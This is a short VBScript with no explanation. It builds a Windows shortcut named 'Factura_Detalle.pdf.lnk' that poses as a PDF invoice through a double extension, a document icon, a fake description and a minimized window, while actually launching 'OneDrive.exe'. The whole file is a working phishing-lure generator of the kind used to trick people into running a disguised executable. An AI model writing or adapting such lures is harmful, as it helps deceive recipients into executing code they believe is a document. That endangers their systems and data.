Set oWS = CreateObject("WScript.Shell")
sLinkFile = "Factura_Detalle.pdf.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "OneDrive.exe"
oLink.Arguments = "Factura_Real.pdf"
oLink.WindowStyle = 7
oLink.IconLocation = "C:\Windows\System32\imageres.dll,25"
oLink.Description = "Factura Detallada"
oLink.WorkingDirectory = "."
oLink.Save
